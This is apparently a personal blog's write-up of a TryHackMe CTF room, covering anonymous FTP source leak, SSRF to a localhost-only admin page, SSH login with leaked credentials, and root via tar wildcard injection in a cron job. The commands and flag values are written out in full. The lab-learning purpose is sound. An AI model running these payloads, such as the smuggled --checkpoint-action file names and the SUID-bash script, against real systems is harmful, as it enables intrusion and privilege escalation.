@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Operation Coldstart | Jenn Shagrin</title>
+<meta name="keywords" content="">
+<meta name="description" content="TryHackMe CTF: anonymous FTP backup source leak, SSRF through /preview to localhost-only admin, SSH creds from admin notes, tar wildcard privilege escalation to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/operation-coldstart.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<link rel="stylesheet" href="/assets/css/accents.css">
+<meta property="og:url" content="https://jennshaggy.github.io/operation-coldstart.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Operation Coldstart">
+<meta property="og:description" content="TryHackMe CTF: anonymous FTP backup source leak, SSRF through /preview to localhost-only admin, SSH creds from admin notes, tar wildcard privilege escalation to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Operation Coldstart">
+<meta name="twitter:description" content="TryHackMe CTF: anonymous FTP backup source leak, SSRF through /preview to localhost-only admin, SSH creds from admin notes, tar wildcard privilege escalation to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Operation Coldstart</h1>
+    <div class="post-description">TryHackMe CTF. Volt Labs suspects an old staging server has rotted into an exposed liability. Anonymous FTP, source code leak, SSRF to localhost admin, SSH creds, tar wildcard to root.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Volt Labs is a small SaaS shop. They suspect an old staging server has rotted into an exposed liability. Mara assigned the engagement: find a way in and demonstrate full compromise.</p>
+
+<p>Let&rsquo;s wake up the staging server everyone left behind.</p>
+
+<hr>
+
+<h2>Fingerprinting the sleeping box</h2>
+
+<p>First contact:</p>
+
+<pre><code class="language-bash">curl -I http://TARGET_IP</code></pre>
+
+<p>A <code>gunicorn</code> server, unless someone spoofed the headers.</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-30 at 6.21.19 PM.png" alt="curl -I response showing gunicorn server header" style="max-width:100%;margin:2rem 0;">
+
+<p>One quick confirmation:</p>
+
+<pre><code class="language-bash">wappalyzer -i http://TARGET_IP</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-30 at 6.31.43 PM.png" alt="wappalyzer output confirming Gunicorn and Python stack" style="max-width:100%;margin:2rem 0;">
+
+<p>Thank you, wappalyzer.</p>
+
+<p>I set Nmap running and did browser recon while it worked.</p>
+
+<pre><code class="language-bash">nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP</code></pre>
+
+<p>A visit in-browser:</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-30 at 6.32.18 PM.png" alt="staging app in browser with footer reading do not expose externally" style="max-width:100%;margin:2rem 0;">
+
+<p>The footer says &ldquo;do not expose externally.&rdquo; All lowercase. Why would that be there? The &ldquo;internal tool&rdquo; label and its vagueness are equally interesting.</p>
+
+<p>A staging server is built to be an exact or near-exact replica of production. It&rsquo;s the final checkpoint before deployment, the place to confirm features work in an environment that mirrors live. Which means whatever&rsquo;s running here is probably running there too.</p>
+
+<p>Nmap results:</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-30 at 6.40.23 PM.png" alt="nmap scan results showing ports 21 FTP, 22 SSH, 80 HTTP Gunicorn" style="max-width:100%;margin:2rem 0;">
+
+<p><strong>Open ports:</strong></p>
+<ul>
+<li>21 FTP. That could come in handy.</li>
+<li>22 SSH</li>
+<li>80 HTTP, Gunicorn confirmed again</li>
+</ul>
+
+<p>Wide-open anonymous FTP on a staging server. Let&rsquo;s see if we can walk in.</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 7.03.37 AM.png" alt="FTP anonymous login succeeding" style="max-width:100%;margin:2rem 0;">
+
+<p>Suspiciously easy. Hopefully not a red herring.</p>
+
+<p><code>ls -la</code> works on this FTP box. Traversing into <code>pub</code>:</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 7.08.21 AM.png" alt="FTP pub directory listing showing backup.tar.gz" style="max-width:100%;margin:2rem 0;">
+
+<p><code>backup.tar.gz</code>. I&rsquo;ll be taking that to-go, please and thank you.</p>
+
+<pre><code>binary
+get backup.tar.gz
+bye</code></pre>
+
+<hr>
+
+<h2>Inspect before you extract</h2>
+
+<p>We are not extracting this blind. Inspect locally first, and only then extract into a contained folder.</p>
+
+<pre><code class="language-bash">mkdir ftp_backup
+tar -xzf backup.tar.gz -C ftp_backup
+cd ftp_backup
+find . -maxdepth 4 -type f -ls</code></pre>
+
+<p>Sweep for anything useful:</p>
+
+<pre><code class="language-bash">grep -RniE "password|passwd|secret|token|key|admin|user|username|ssh|db|database|env|debug|flask|gunicorn" .</code></pre>
+
+<p>And a sweep for hidden files:</p>
+
+<pre><code class="language-bash">find . -name ".*" -ls</code></pre>
+
+<p>This is why we inspect first.</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 7.22.47 AM.png" alt="source inspection output with the standout line about admin routes gated to localhost only" style="max-width:100%;margin:2rem 0;">
+
+<p>The standout line:</p>
+
+<pre><code>Admin routes are gated by source-IP check (localhost only).</code></pre>
+
+<p>The archive is the full Flask/Gunicorn source for the staging app. Instead of guessing endpoints from the browser, the source tells us everything.</p>
+
+<pre><code class="language-bash">sed -n '1,180p' voltlabs-preview/app.py
+grep -nE "route|admin|request|remote_addr|X-Forwarded|headers|localhost|127|abort|open" voltlabs-preview/app.py</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 7.34.01 AM.png" alt="app.py routes showing /preview url parameter, ALLOWED_HOSTS kestrel.thm, /admin/ localhost restriction, /admin/notes reading admin_notes.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>Quite a find. What the source gives us:</p>
+
+<ul>
+<li><code>/preview</code> accepts a user-supplied <code>url</code> parameter</li>
+<li><code>ALLOWED_HOSTS = {"kestrel.thm"}</code>, and the comments say <code>kestrel.thm</code> resolves to 127.0.0.1 on the server</li>
+<li><code>/admin/</code> is restricted to requests from <code>127.x.x.x</code> via <code>request.remote_addr</code></li>
+<li><code>/admin/notes</code> reads <code>/opt/voltlabs-preview/admin_notes.txt</code></li>
+<li>the source comments openly describe the SSRF weakness</li>
+</ul>
+
+<p>So the intended path: use <code>/preview</code> as an SSRF primitive to reach the localhost-only admin content.</p>
+
+<hr>
+
+<h2>Confirm the front door is locked</h2>
+
+<pre><code class="language-bash">curl -i http://TARGET_IP/admin/
+curl -i http://TARGET_IP/admin/notes</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 7.48.20 AM.png" alt="curl to /admin/ and /admin/notes both returning 403 Forbidden" style="max-width:100%;margin:2rem 0;">
+
+<p>Both return 403 Forbidden. Direct admin access is blocked, exactly as the source said.</p>
+
+<hr>
+
+<h2>SSRF through the side door</h2>
+
+<p>The source is clear: <code>kestrel.thm</code> is allowed and resolves to 127.0.0.1 on the target. The admin route allows <code>127.x.x.x</code>. So <code>/preview</code> should bridge us into <code>/admin/</code>.</p>
+
+<pre><code class="language-bash">curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/"</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.14.08 AM.png" alt="SSRF via /preview returning the /admin/ page that was blocked directly" style="max-width:100%;margin:2rem 0;">
+
+<p>SSRF to local admin confirmed. <code>/admin/</code> was blocked directly, but the server fetched it for us through <code>/preview</code>.</p>
+
+<p>Now the notes file:</p>
+
+<pre><code class="language-bash">curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/notes"</code></pre>
+
+<p>I think we just pwned our new friend, Mara.</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.18.43 AM.png" alt="/admin/notes via SSRF leaking staging SSH credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>The SSRF exposed staging SSH credentials.</p>
+
+<hr>
+
+<h2>Inside as webdev</h2>
+
+<pre><code class="language-bash">ssh webdev@TARGET_IP</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.20.12 AM.png" alt="SSH login successful as webdev" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re in as <code>webdev</code>.</p>
+
+<pre><code class="language-bash">whoami &amp;&amp; hostname &amp;&amp; pwd
+cat user.txt</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.25.23 AM.png" alt="whoami, hostname, user.txt flag THM{96dc7bd50d2fb98fcece01560788b5ab}" style="max-width:100%;margin:2rem 0;">
+
+<p>First flag: <code>THM{96dc7bd50d2fb98fcece01560788b5ab}</code></p>
+
+<hr>
+
+<h2>Hunting the privesc</h2>
+
+<p>Standard checks first.</p>
+
+<pre><code class="language-bash">sudo -l</code></pre>
+
+<p>Not via sudo.</p>
+
+<pre><code class="language-bash">find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+<p>SUID returned mostly standard system binaries and Snap noise. <code>/opt</code> is the better lead, and the app source already pointed there.</p>
+
+<pre><code class="language-bash">ls -la /opt
+ls -la /opt/voltlabs-preview</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.37.40 AM.png" alt="/opt listing showing admin_notes.txt owned by voltapp group and /opt/backups owned by webdev" style="max-width:100%;margin:2rem 0;">
+
+<p><code>admin_notes.txt</code> is owned by group <code>voltapp</code> and not readable by <code>webdev</code> directly. <code>webdev</code> does own and write to <code>/opt/backups</code>, though.</p>
+
+<p>Find what <code>webdev</code> can write, and what touches it:</p>
+
+<pre><code class="language-bash">find / -type d -writable 2>/dev/null | grep -vE '^/proc|^/sys|^/run|^/dev'</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.43.06 AM.png" alt="writable directories showing /opt/backups is writable by webdev" style="max-width:100%;margin:2rem 0;">
+
+<p>A root cron job, running every minute out of the writable backups directory:</p>
+
+<pre><code class="language-bash">cat /etc/cron.d/voltlabs-backup</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.44.41 AM.png" alt="cron.d/voltlabs-backup showing root running tar czf with wildcard in /opt/backups every minute" style="max-width:100%;margin:2rem 0;">
+
+<pre><code>* * * * * root cd /opt/backups &amp;&amp; tar czf /var/backups/uploads.tgz *</code></pre>
+
+<p>That&rsquo;s the privesc. <code>webdev</code> can write into <code>/opt/backups</code>, and root runs <code>tar</code> there with a wildcard.</p>
+
+<hr>
+
+<h2>tar wildcard to root</h2>
+
+<p><code>tar</code> treats wildcard-expanded filenames that start with <code>--</code> as options. We can smuggle in <code>--checkpoint-action</code> to make root&rsquo;s tar run our script.</p>
+
+<p>Stage the payload:</p>
+
+<pre><code class="language-bash">cd /opt/backups
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
+chmod +x shell.sh</code></pre>
+
+<p>Plant the option files:</p>
+
+<pre><code class="language-bash">touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+ls -la</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.50.02 AM.png" alt="/opt/backups listing showing shell.sh and the two --checkpoint option files staged" style="max-width:100%;margin:2rem 0;">
+
+<p>Staged. When root&rsquo;s cron fires tar, it should run <code>shell.sh</code> and drop a SUID bash.</p>
+
+<pre><code class="language-bash">sleep 70; ls -la /tmp/rootbash</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.56.42 AM.png" alt="/tmp/rootbash present with SUID bit set after cron fires" style="max-width:100%;margin:2rem 0;">
+
+<p>Success.</p>
+
+<pre><code class="language-bash">/tmp/rootbash -p
+whoami</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.57.19 AM.png" alt="/tmp/rootbash -p dropping to root shell, whoami returning root" style="max-width:100%;margin:2rem 0;">
+
+<p>The root has been bashed. Writable backup directory plus root cron tar wildcard equals root command execution.</p>
+
+<pre><code class="language-bash">find / -name "flag.txt" 2>/dev/null</code></pre>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 8.58.36 AM.png" alt="find returning /root/flag.txt" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: <code>THM{e6ee84a483d67ade06936fcfd1433e8a}</code></p>
+
+<hr>
+
+<h2>Clean up</h2>
+
+<pre><code class="language-bash">rm -f /tmp/rootbash
+rm -f /opt/backups/shell.sh
+rm -f /opt/backups/--checkpoint=1
+rm -f "/opt/backups/--checkpoint-action=exec=sh shell.sh"</code></pre>
+
+<p>I was raised to leave a place as I found it.</p>
+
+<img src="/images/operation-coldstart/Screenshot 2026-05-31 at 9.01.34 AM.png" alt="/opt/backups clean after removing all staged exploit files" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code class="language-bash"># 1. Recon
+curl -I http://TARGET_IP
+nmap -sS -Pn -sC -sV --script=vuln -T4 -A TARGET_IP
+# Ports: 21 FTP, 22 SSH, 80 HTTP (Gunicorn)
+
+# 2. Anonymous FTP, grab the backup
+ftp TARGET_IP        # anonymous login
+cd pub
+binary
+get backup.tar.gz
+bye
+
+# 3. Inspect source, find the SSRF + localhost admin design
+tar -xzf backup.tar.gz -C ftp_backup
+grep -nE "route|admin|remote_addr|localhost|127" ftp_backup/voltlabs-preview/app.py
+# /preview takes url=, ALLOWED_HOSTS={kestrel.thm} -> 127.0.0.1
+# /admin/ restricted to 127.x.x.x
+
+# 4. SSRF through /preview to reach localhost-only admin
+curl -i "http://TARGET_IP/preview?url=http://kestrel.thm/admin/notes"
+# leaks staging SSH credentials
+
+# 5. SSH in as webdev -> user flag
+ssh webdev@TARGET_IP
+cat user.txt
+
+# 6. Privesc: root cron runs tar with a wildcard in writable /opt/backups
+cd /opt/backups
+echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
+chmod +x shell.sh
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
+sleep 70
+/tmp/rootbash -p        # root</code></pre>
+
+<p>Recap: anonymous FTP, backup source leak, SSRF to localhost admin, SSH creds, user flag, root cron tar wildcard, root flag.</p>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
